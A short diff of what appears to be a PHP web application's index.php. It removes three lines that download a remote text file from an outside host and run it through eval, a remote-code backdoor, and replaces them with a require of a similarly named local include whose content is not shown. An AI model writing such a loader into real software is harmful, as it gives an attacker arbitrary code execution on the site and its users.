@@ -1,7 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/mrjdu.txt'));
-$url = "?> ".$url;
-eval($url);
+require('mrjdu.incs.php');
 
 /**
  * @defgroup index Index
